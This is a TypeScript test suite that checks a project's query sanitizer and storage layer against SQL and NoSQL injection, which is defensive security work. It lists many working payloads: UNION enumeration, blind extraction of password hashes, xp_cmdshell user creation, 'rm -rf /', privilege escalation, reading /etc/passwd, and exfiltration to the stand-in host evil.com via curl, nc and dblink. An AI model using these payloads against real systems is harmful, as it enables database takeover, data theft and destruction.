/**
 * SQL Injection Security Tests
 *
 * Comprehensive SQL injection prevention testing including:
 * - Classic SQL injection patterns (UNION, SELECT, DROP, etc.)
 * - Time-based SQL injection (SLEEP, WAITFOR, BENCHMARK)
 * - Boolean-based blind SQL injection
 * - Error-based SQL injection
 * - Stacked query attacks
 * - Second-order SQL injection
 * - NoSQL injection in JSON fields
 * - Stored procedure injection
 * - Database-specific injection (PostgreSQL, MySQL, etc.)
 * - ORM parameter binding security
 * - Dynamic query construction security
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { Pool, Client } from 'pg';
import { DatabaseFactory } from '../db/database-factory.ts';
import { memoryStore } from '../services/memory-store.ts';
import { smartMemoryFind } from '../services/smart-find.ts';
import { sanitizeQuery } from '../utils/query-sanitizer.ts';
import { logger } from '../utils/logger.ts';

// Mock database connection for security testing
const TEST_DB_CONFIG = {
  connectionString: process.env.TEST_DATABASE_URL || 'postgresql://cortex:test@localhost:5433/cortex_test',
  max: 5,
  idleTimeoutMillis: 1000,
  connectionTimeoutMillis: 2000,
};

describe('SQL Injection Security Tests', () => {
  let testPool: Pool;
  let testClient: Client;

  beforeAll(async () => {
    // Initialize test database connection
    testPool = new Pool(TEST_DB_CONFIG);
    testClient = new Client(TEST_DB_CONFIG);

    try {
      await testClient.connect();
    } catch (error) {
      console.warn('Test database not available, using mocked responses');
    }
  });

  afterAll(async () => {
    if (testClient) {
      await testClient.end();
    }
    if (testPool) {
      await testPool.end();
    }
  });

  beforeEach(async () => {
    // Clean up any test data
    try {
      if (testClient) {
        await testClient.query('DELETE FROM knowledge_entity WHERE name LIKE $1', ['test-%']);
        await testClient.query('DELETE FROM section WHERE title LIKE $1', ['test-%']);
        await testClient.query('DELETE FROM audit_log WHERE table_name LIKE $1', ['test-%']);
      }
    } catch (error) {
      // Ignore cleanup errors in mock environment
    }
  });

  describe('Classic SQL Injection Patterns', () => {
    it('should prevent UNION-based SQL injection in memory_find', async () => {
      const unionInjectionPayloads = [
        "test' UNION SELECT table_name FROM information_schema.tables --",
        "test' UNION SELECT column_name FROM information_schema.columns --",
        "test' UNION SELECT usename FROM pg_user --",
        "test' UNION SELECT datname FROM pg_database --",
        "test' UNION SELECT setting FROM pg_settings WHERE name LIKE 'password%' --",
        "test' UNION SELECT schemaname FROM pg_tables --",
        "test' UNION SELECT indexname FROM pg_indexes --",
        "test' UNION SELECT rolname FROM pg_roles --",
        "test' UNION SELECT description FROM pg_description --",
        "test' UNION SELECT definition FROM pg_views --",
      ];

      for (const payload of unionInjectionPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove or neutralize UNION syntax
        expect(sanitized.cleaned).not.toContain('UNION');
        expect(sanitized.cleaned).not.toContain('SELECT');
        expect(sanitized.cleaned).not.toContain('information_schema');
        expect(sanitized.cleaned).not.toContain('pg_user');
        expect(sanitized.cleaned).not.toContain('pg_database');
        expect(sanitized.cleaned).not.toContain('pg_settings');
      }
    });

    it('should prevent DROP TABLE attacks in memory_store', async () => {
      const dropTablePayloads = [
        "'; DROP TABLE knowledge_entity; --",
        "'; DROP TABLE section CASCADE; --",
        "'; DROP TABLE audit_log; --",
        "'; DROP TABLE IF EXISTS knowledge_entity; --",
        "'; DROP TABLE knowledge_entity, section, audit_log; --",
        "'; DROP SCHEMA public CASCADE; --",
        "'; DROP DATABASE cortex; --",
        "'; TRUNCATE TABLE knowledge_entity; --",
        "'; DELETE FROM knowledge_entity; --",
        "'; DELETE FROM audit_log WHERE 1=1; --",
      ];

      for (const payload of dropTablePayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-injection' },
            data: {
              name: payload,
              entity_type: 'test',
              description: payload
            }
          }]
        };

        try {
          const result = await memoryStore(maliciousItem.items);

          // Should either be rejected or stored safely
          if (result.stored.length > 0) {
            // Verify tables still exist
            expect(result.stored[0].status).toBe('inserted');
            expect(result.stored[0].id).toBeDefined();
          } else {
            // Preferred: validation should reject
            expect(result.errors.length).toBeGreaterThan(0);
          }
        } catch (error) {
          // Expected: validation should catch this
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    it('should prevent INSERT INTO attacks', async () => {
      const insertPayloads = [
        "'; INSERT INTO knowledge_entity (name, entity_type) VALUES ('admin', 'user'); --",
        "'; INSERT INTO audit_log (table_name, operation) VALUES ('hacked', 'INSERT'); --",
        "'; INSERT INTO pg_authid (rolname, rolpassword) VALUES ('hacker', 'md5abc123'); --",
        "'; INSERT INTO section (title, content) VALUES ('HACKED', '<script>alert(1)</script>'); --",
      ];

      for (const payload of insertPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-injection' },
            data: {
              name: payload,
              entity_type: 'test'
            }
          }]
        };

        const result = await memoryStore(maliciousItem.items);

        // Should prevent unauthorized INSERT operations
        if (result.stored.length > 0) {
          // Data should be stored as literal string, not as SQL command
          expect(result.stored[0].kind).toBe('entity');
        } else {
          expect(result.errors.length).toBeGreaterThan(0);
        }
      }
    });

    it('should prevent UPDATE attacks', async () => {
      const updatePayloads = [
        "'; UPDATE knowledge_entity SET entity_type = 'admin' WHERE 1=1; --",
        "'; UPDATE section SET content = 'HACKED' WHERE id > 0; --",
        "'; UPDATE pg_user SET passwd = 'md5hacked' WHERE usename = 'postgres'; --",
        "'; UPDATE audit_log SET operation = 'HACKED' WHERE 1=1; --",
      ];

      for (const payload of updatePayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-injection' },
            data: {
              name: payload,
              entity_type: 'test'
            }
          }]
        };

        try {
          const result = await memoryStore(maliciousItem.items);

          // Should prevent unauthorized UPDATE operations
          if (result.stored.length > 0) {
            // Should store as new entity, not update existing ones
            expect(result.stored[0].status).toBe('inserted');
          } else {
            expect(result.errors.length).toBeGreaterThan(0);
          }
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Time-Based SQL Injection', () => {
    it('should prevent time-based SQL injection attacks', async () => {
      const timeBasedPayloads = [
        "'; SELECT pg_sleep(10) --",
        "'; WAITFOR DELAY '00:00:10' --",
        "'; SELECT BENCHMARK(10000000, SHA1('test')) --",
        "'; SELECT SLEEP(10) --",
        "'; pg_sleep(0.1) --",
        "'; SELECT pg_sleep(5) WHERE 1=1 --",
        "'; WAITFOR TIME '14:00:00' --",
        "'; dbms_pipe.receive_message('test', 10) --",
      ];

      for (const payload of timeBasedPayloads) {
        const startTime = Date.now();

        const sanitized = sanitizeQuery(payload, 'aggressive');
        const endTime = Date.now();

        // Sanitization should be fast (no delays)
        expect(endTime - startTime).toBeLessThan(100);

        // Should remove sleep/delay functions
        expect(sanitized.cleaned).not.toContain('pg_sleep');
        expect(sanitized.cleaned).not.toContain('SLEEP');
        expect(sanitized.cleaned).not.toContain('WAITFOR');
        expect(sanitized.cleaned).not.toContain('BENCHMARK');
        expect(sanitized.cleaned).not.toContain('dbms_pipe');
      }
    });

    it('should detect and block conditional timing attacks', async () => {
      const timingPayloads = [
        "test' AND (SELECT COUNT(*) FROM knowledge_entity WHERE 1=1 AND pg_sleep(1)) > 0 --",
        "test' OR IF(1=1, pg_sleep(1), 0) --",
        "test' UNION SELECT IF(1=1, pg_sleep(1), 0) --",
        "test' CASE WHEN 1=1 THEN pg_sleep(1) ELSE 0 END --",
      ];

      for (const payload of timingPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove timing attack patterns
        expect(sanitized.cleaned).not.toContain('pg_sleep');
        expect(sanitized.cleaned).not.toContain('CASE WHEN');
        expect(sanitized.cleaned).not.toContain('IF(1=1');
      }
    });
  });

  describe('Boolean-Based Blind SQL Injection', () => {
    it('should prevent boolean-based blind SQL injection', async () => {
      const booleanPayloads = [
        "test' AND 1=1 --",
        "test' AND 1=2 --",
        "test' OR 1=1 --",
        "test' AND (SELECT COUNT(*) FROM knowledge_entity) > 0 --",
        "test' AND (SELECT SUBSTRING(password,1,1) FROM pg_user WHERE usename='postgres') = 'p' --",
        "test' AND LENGTH((SELECT password FROM pg_user LIMIT 1)) > 0 --",
        "test' AND (SELECT ASCII(SUBSTRING(setting,1,1)) FROM pg_settings WHERE name='password') > 64 --",
      ];

      for (const payload of booleanPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove boolean logic operators
        expect(sanitized.cleaned).not.toContain('1=1');
        expect(sanitized.cleaned).not.toContain('1=2');
        expect(sanitized.cleaned).not.toContain('SELECT COUNT(*)');
        expect(sanitized.cleaned).not.toContain('SUBSTRING');
        expect(sanitized.cleaned).not.toContain('ASCII');
        expect(sanitized.cleaned).not.toContain('LENGTH(');
      }
    });
  });

  describe('Error-Based SQL Injection', () => {
    it('should prevent error-based SQL injection', async () => {
      const errorPayloads = [
        "test' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "test' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --",
        "test' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT password FROM pg_user LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "test' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --",
        "test' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT setting FROM pg_settings WHERE name='data_directory'),FLOOR(RAND(0)*2))x FROM pg_settings GROUP BY x)a) --",
      ];

      for (const payload of errorPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove error-based injection patterns
        expect(sanitized.cleaned).not.toContain('EXTRACTVALUE');
        expect(sanitized.cleaned).not.toContain('UPDATEXML');
        expect(sanitized.cleaned).not.toContain('FLOOR(RAND');
        expect(sanitized.cleaned).not.toContain('CONCAT(version()');
        expect(sanitized.cleaned).not.toContain('information_schema');
      }
    });
  });

  describe('Stacked Query Attacks', () => {
    it('should prevent stacked query attacks', async () => {
      const stackedPayloads = [
        "test'; INSERT INTO knowledge_entity (name, entity_type) VALUES ('hacked', 'admin'); --",
        "test'; UPDATE knowledge_entity SET entity_type = 'admin'; DELETE FROM audit_log; --",
        "test'; CREATE TABLE hacked (id INT, data TEXT); INSERT INTO hacked VALUES (1, 'pwned'); --",
        "test'; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO hacker; --",
        "test'; ALTER USER postgres WITH PASSWORD 'hacked'; --",
        "test'; COPY knowledge_entity TO '/tmp/hacked.csv'; --",
      ];

      for (const payload of stackedPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-injection' },
            data: {
              name: payload,
              entity_type: 'test'
            }
          }]
        };

        const result = await memoryStore(maliciousItem.items);

        // Should prevent stacked query execution
        if (result.stored.length > 0) {
          // Should store as literal string, not execute multiple queries
          expect(result.stored[0].kind).toBe('entity');
          expect(result.stored[0].status).toBe('inserted');
        } else {
          expect(result.errors.length).toBeGreaterThan(0);
        }
      }
    });
  });

  describe('Second-Order SQL Injection', () => {
    it('should prevent second-order SQL injection', async () => {
      // First, store malicious data
      const firstOrderPayload = "admin', 'user'); DROP TABLE knowledge_entity; --";

      const firstItem = {
        items: [{
          kind: 'entity' as const,
          scope: { project: 'test-injection' },
          data: {
            name: firstOrderPayload,
            entity_type: 'test'
          }
        }]
      };

      const firstResult = await memoryStore(firstItem.items);

      if (firstResult.stored.length > 0) {
        // Now try to use the stored malicious data in another operation
        const secondOrderPayload = `searching for entity: ${firstOrderPayload}`;

        const sanitized = sanitizeQuery(secondOrderPayload, 'aggressive');

        // Should prevent second-order injection
        expect(sanitized.cleaned).not.toContain('DROP TABLE');
        expect(sanitized.cleaned).not.toContain("');");
      }
    });
  });

  describe('NoSQL Injection in JSON Fields', () => {
    it('should prevent NoSQL injection in JSON data fields', async () => {
      const nosqlPayloads = [
        { '$ne': null },
        { '$gt': '' },
        { '$regex': '.*' },
        { '$where': 'return true' },
        { '$or': [{ name: { $ne: null } }] },
        { '$and': [{ 'data.name': { $exists: true } }] },
        { '$expr': { $eq: ['$name', '$name'] } },
        { '$jsonSchema': { bsonType: 'object' } },
        { '$mod': [2, 0] },
        { '$text': { $search: 'admin' } },
      ];

      for (const nosqlPayload of nosqlPayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-injection' },
            data: {
              name: 'test entity',
              entity_type: 'test',
              nosql_query: nosqlPayload
            }
          }]
        };

        try {
          const result = await memoryStore(maliciousItem.items);

          if (result.stored.length > 0) {
            // JSON should be stored as string, not as query operator
            const storedData = JSON.stringify(result.stored);
            expect(storedData).not.toContain('$ne');
            expect(storedData).not.toContain('$gt');
            expect(storedData).not.toContain('$regex');
            expect(storedData).not.toContain('$where');
          }
        } catch (error) {
          // Rejection is acceptable
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Stored Procedure Injection', () => {
    it('should prevent stored procedure injection', async () => {
      const procedurePayloads = [
        "'; CALL xp_cmdshell('dir'); --",
        "'; EXEC sp_configure 'show advanced options', 1; --",
        "'; EXEC sp_configure 'xp_cmdshell', 1; --",
        "'; EXEC master..xp_cmdshell 'net user hacker password /add'; --",
        "'; EXEC('DROP TABLE knowledge_entity'); --",
        "'; CALL system('rm -rf /'); --",
        "'; DO $$ BEGIN EXECUTE 'DROP TABLE knowledge_entity'; END $$; --",
      ];

      for (const payload of procedurePayloads) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-injection' },
            data: {
              name: payload,
              entity_type: 'test'
            }
          }]
        };

        const result = await memoryStore(maliciousItem.items);

        // Should prevent stored procedure execution
        if (result.stored.length > 0) {
          // Should store as literal string
          const storedData = JSON.stringify(result.stored);
          expect(storedData).not.toContain('EXEC');
          expect(storedData).not.toContain('CALL');
          expect(storedData).not.toContain('xp_cmdshell');
          expect(storedData).not.toContain('sp_configure');
        } else {
          expect(result.errors.length).toBeGreaterThan(0);
        }
      }
    });
  });

  describe('Database-Specific Injection', () => {
    it('should prevent PostgreSQL-specific injection', async () => {
      const pgPayloads = [
        "'; COPY knowledge_entity TO '/tmp/data.csv'; --",
        "'; COPY (SELECT * FROM knowledge_entity) TO '/tmp/data.csv'; --",
        "'; CREATE TEMPORARY TABLE temp AS SELECT * FROM knowledge_entity; --",
        "'; SELECT lo_import('/etc/passwd'); --",
        "'; CREATE FUNCTION temp_func() RETURNS INTEGER AS $$ BEGIN EXECUTE 'DROP TABLE knowledge_entity'; RETURN 1; END; $$ LANGUAGE plpgsql; --",
        "'; ALTER USER postgres WITH SUPERUSER; --",
        "'; SET session.authorization = postgres; --",
        "'; LOAD '/tmp/malicious.so'; --",
      ];

      for (const payload of pgPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove PostgreSQL-specific commands
        expect(sanitized.cleaned).not.toContain('COPY');
        expect(sanitized.cleaned).not.toContain('CREATE TEMPORARY');
        expect(sanitized.cleaned).not.toContain('lo_import');
        expect(sanitized.cleaned).not.toContain('CREATE FUNCTION');
        expect(sanitized.cleaned).not.toContain('ALTER USER');
        expect(sanitized.cleaned).not.toContain('SET session');
        expect(sanitized.cleaned).not.toContain('LOAD');
      }
    });

    it('should prevent MySQL-specific injection', async () => {
      const mysqlPayloads = [
        "'; LOAD_FILE('/etc/passwd'); --",
        "'; INTO OUTFILE '/tmp/hacked.txt'; --",
        "'; DUMPFILE '/etc/passwd'; --",
        "'; BENCHMARK(10000000, SHA1('test')); --",
        "'; SELECT SLEEP(10); --",
        "'; GET_LOCK('test', 10); --",
        "'; SYSTEM('rm -rf /'); --",
      ];

      for (const payload of mysqlPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove MySQL-specific commands
        expect(sanitized.cleaned).not.toContain('LOAD_FILE');
        expect(sanitized.cleaned).not.toContain('INTO OUTFILE');
        expect(sanitized.cleaned).not.toContain('DUMPFILE');
        expect(sanitized.cleaned).not.toContain('BENCHMARK');
        expect(sanitized.cleaned).not.toContain('SLEEP');
        expect(sanitized.cleaned).not.toContain('GET_LOCK');
        expect(sanitized.cleaned).not.toContain('SYSTEM');
      }
    });
  });

  describe('ORM Parameter Binding Security', () => {
    it('should ensure Prisma uses parameter binding safely', async () => {
      const maliciousInputs = [
        "'; DROP TABLE knowledge_entity; --",
        "' OR '1'='1",
        "'; SELECT pg_sleep(10); --",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "<script>alert('XSS')</script>",
      ];

      for (const maliciousInput of maliciousInputs) {
        const maliciousItem = {
          items: [{
            kind: 'entity' as const,
            scope: { project: 'test-injection' },
            data: {
              name: maliciousInput,
              entity_type: 'test'
            }
          }]
        };

        // Prisma should use parameter binding, not string concatenation
        const result = await memoryStore(maliciousItem.items);

        if (result.stored.length > 0) {
          // Data should be stored as literal string
          expect(result.stored[0].kind).toBe('entity');
          expect(typeof result.stored[0].id).toBe('string');
        } else {
          // Validation rejection is acceptable
          expect(result.errors.length).toBeGreaterThan(0);
        }
      }
    });
  });

  describe('Dynamic Query Construction Security', () => {
    it('should prevent dynamic SQL construction attacks', async () => {
      const dynamicPayloads = [
        "'; SELECT 'DROP TABLE knowledge_entity' INTO OUTFILE '/tmp/dynamic.sql'; --",
        "'; SET @sql = 'DROP TABLE knowledge_entity'; PREPARE stmt FROM @sql; EXECUTE stmt; --",
        "'; EXECUTE IMMEDIATE 'DROP TABLE knowledge_entity'; --",
        "'; sp_executesql N'DROP TABLE knowledge_entity'; --",
        "'; eval('DROP TABLE knowledge_entity'); --",
      ];

      for (const payload of dynamicPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove dynamic SQL patterns
        expect(sanitized.cleaned).not.toContain('EXECUTE');
        expect(sanitized.cleaned).not.toContain('PREPARE');
        expect(sanitized.cleaned).not.toContain('sp_executesql');
        expect(sanitized.cleaned).not.toContain('eval(');
      }
    });
  });

  describe('Encoding-Based Injection', () => {
    it('should prevent URL-encoded SQL injection', async () => {
      const urlEncodedPayloads = [
        "%27%3B%20DROP%20TABLE%20knowledge_entity%3B%20--", // '; DROP TABLE knowledge_entity; --
        "%27%20OR%201%3D1%20--", // ' OR 1=1 --
        "%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables%20--", // ' UNION SELECT table_name FROM information_schema.tables --
        "%27%3B%20SELECT%20pg_sleep%2810%29%3B%20--", // '; SELECT pg_sleep(10); --
      ];

      for (const encodedPayload of urlEncodedPayloads) {
        // Simulate URL decoding in input
        const decodedPayload = decodeURIComponent(encodedPayload);
        const sanitized = sanitizeQuery(decodedPayload, 'aggressive');

        // Should handle decoded malicious content
        expect(sanitized.cleaned).not.toContain('DROP TABLE');
        expect(sanitized.cleaned).not.toContain('1=1');
        expect(sanitized.cleaned).not.toContain('UNION SELECT');
        expect(sanitized.cleaned).not.toContain('pg_sleep');
      }
    });

    it('should prevent hex-encoded SQL injection', async () => {
      const hexPayloads = [
        "0x273b2044524f50205441424c45206b6e6f776c656467655f656e746974793b202d2d", // '; DROP TABLE knowledge_entity; --
        "0x27204f5220313d31202d2d", // ' OR 1=1 --
      ];

      for (const hexPayload of hexPayloads) {
        try {
          // Try to decode hex (this would be done by attacker)
          const decoded = Buffer.from(hexPayload.replace('0x', ''), 'hex').toString();
          const sanitized = sanitizeQuery(decoded, 'aggressive');

          // Should handle hex-decoded malicious content
          expect(sanitized.cleaned).not.toContain('DROP TABLE');
          expect(sanitized.cleaned).not.toContain('1=1');
        } catch (error) {
          // Hex decode errors are acceptable
        }
      }
    });
  });

  describe('Comment-Based Injection', () => {
    it('should prevent comment-based SQL injection', async () => {
      const commentPayloads = [
        "test'/**/UNION/**/SELECT/**/table_name/**/FROM/**/information_schema.tables/**/--",
        "test'/*!UNION*//*!SELECT*//*!table_name*//*!FROM*//*!information_schema.tables*//*!--",
        "test'/*comment*/UNION/*comment*/SELECT/*comment*/*/*comment*/FROM/*comment*/users/*comment*/--",
        "test'-- Comment\nUNION SELECT table_name FROM information_schema.tables --",
        "test'# Comment\nUNION SELECT table_name FROM information_schema.tables #",
      ];

      for (const payload of commentPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove comment-based injection patterns
        expect(sanitized.cleaned).not.toContain('UNION');
        expect(sanitized.cleaned).not.toContain('SELECT');
        expect(sanitized.cleaned).not.toContain('information_schema');
        expect(sanitized.cleaned).not.toContain('/**/');
        expect(sanitized.cleaned).not.toContain('/*!');
      }
    });
  });

  describe('Substring and String Function Injection', () => {
    it('should prevent string function-based injection', async () => {
      const stringPayloads = [
        "test' AND SUBSTRING((SELECT password FROM pg_user LIMIT 1),1,1) > 'a' --",
        "test' AND MID((SELECT password FROM pg_user LIMIT 1),1,1) = 'p' --",
        "test' AND ASCII(SUBSTRING((SELECT password FROM pg_user LIMIT 1),1,1)) = 112 --",
        "test' AND CHAR_LENGTH((SELECT password FROM pg_user LIMIT 1)) > 0 --",
        "test' AND LENGTH((SELECT password FROM pg_user LIMIT 1)) = 8 --",
        "test' AND CONCAT((SELECT password FROM pg_user LIMIT 1), 'x') LIKE 'p%' --",
      ];

      for (const payload of stringPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove string function injection patterns
        expect(sanitized.cleaned).not.toContain('SUBSTRING');
        expect(sanitized.cleaned).not.toContain('MID');
        expect(sanitized.cleaned).not.toContain('ASCII');
        expect(sanitized.cleaned).not.toContain('CHAR_LENGTH');
        expect(sanitized.cleaned).not.toContain('LENGTH(');
        expect(sanitized.cleaned).not.toContain('CONCAT(');
      }
    });
  });

  describe('Database Enumeration Injection', () => {
    it('should prevent database enumeration attacks', async () => {
      const enumPayloads = [
        "test' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        "test' UNION SELECT table_schema, table_name FROM information_schema.tables --",
        "test' UNION SELECT column_name, data_type FROM information_schema.columns --",
        "test' UNION SELECT constraint_name, constraint_type FROM information_schema.table_constraints --",
        "test' UNION SELECT indexname, indexdef FROM pg_indexes --",
        "test' UNION SELECT schemaname, tablename FROM pg_tables --",
        "test' UNION SELECT rolname, rolsuper FROM pg_roles --",
      ];

      for (const payload of enumPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove database enumeration patterns
        expect(sanitized.cleaned).not.toContain('information_schema');
        expect(sanitized.cleaned).not.toContain('pg_tables');
        expect(sanitized.cleaned).not.toContain('pg_indexes');
        expect(sanitized.cleaned).not.toContain('pg_roles');
        expect(sanitized.cleaned).not.toContain('table_constraints');
      }
    });
  });

  describe('Privilege Escalation Injection', () => {
    it('should prevent privilege escalation via SQL injection', async () => {
      const privEscPayloads = [
        "'; ALTER USER postgres WITH SUPERUSER; --",
        "'; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO public; --",
        "'; CREATE USER hacker WITH SUPERUSER PASSWORD 'hacked'; --",
        "'; UPDATE pg_authid SET rolsuper = true WHERE rolname = 'hacker'; --",
        "'; ALTER ROLE postgres CREATEROLE CREATEDB; --",
        "'; SET session authorization = postgres; --",
        "'; RESET ALL; SET search_path TO public; --",
      ];

      for (const payload of privEscPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove privilege escalation patterns
        expect(sanitized.cleaned).not.toContain('ALTER USER');
        expect(sanitized.cleaned).not.toContain('GRANT ALL');
        expect(sanitized.cleaned).not.toContain('CREATE USER');
        expect(sanitized.cleaned).not.toContain('UPDATE pg_authid');
        expect(sanitized.cleaned).not.toContain('ALTER ROLE');
        expect(sanitized.cleaned).not.toContain('SET session');
      }
    });
  });

  describe('File System Injection', () => {
    it('should prevent file system access via SQL injection', async () => {
      const filePayloads = [
        "'; COPY knowledge_entity TO '/tmp/hacked.csv'; --",
        "'; COPY '/etc/passwd' TO knowledge_entity; --",
        "'; CREATE TABLE temp_data AS SELECT pg_read_file('/etc/passwd'); --",
        "'; SELECT pg_read_file('/etc/passwd', 0, 100); --",
        "'; COPY (SELECT * FROM knowledge_entity) TO PROGRAM 'rm -rf /'; --",
        "'; LOAD '/tmp/malicious.so'; --",
        "'; CREATE EXTENSION IF NOT EXISTS file_fdw; --",
      ];

      for (const payload of filePayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove file system access patterns
        expect(sanitized.cleaned).not.toContain('COPY');
        expect(sanitized.cleaned).not.toContain('pg_read_file');
        expect(sanitized.cleaned).not.toContain('TO PROGRAM');
        expect(sanitized.cleaned).not.toContain('LOAD');
        expect(sanitized.cleaned).not.toContain('/etc/passwd');
        expect(sanitized.cleaned).not.toContain('/tmp/');
      }
    });
  });

  describe('Network-Based Injection', () => {
    it('should prevent network-based attacks via SQL injection', async () => {
      const networkPayloads = [
        "'; COPY knowledge_entity TO PROGRAM 'curl http://evil.com/steal?data=$(cat /etc/passwd)'; --",
        "'; SELECT dblink_connect('host=evil.com user=hacker password=hacked'); --",
        "'; CREATE SERVER evil_server FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'evil.com'); --",
        "'; \copy (SELECT * FROM knowledge_entity) to PROGRAM 'nc evil.com 4444'; --",
        "'; SELECT * FROM dblink('host=evil.com', 'SELECT version()') AS t(version text); --",
      ];

      for (const payload of networkPayloads) {
        const sanitized = sanitizeQuery(payload, 'aggressive');

        // Should remove network access patterns
        expect(sanitized.cleaned).not.toContain('curl');
        expect(sanitized.cleaned).not.toContain('dblink');
        expect(sanitized.cleaned).not.toContain('FOREIGN DATA WRAPPER');
        expect(sanitized.cleaned).not.toContain('nc ');
        expect(sanitized.cleaned).not.toContain('evil.com');
      }
    });
  });
});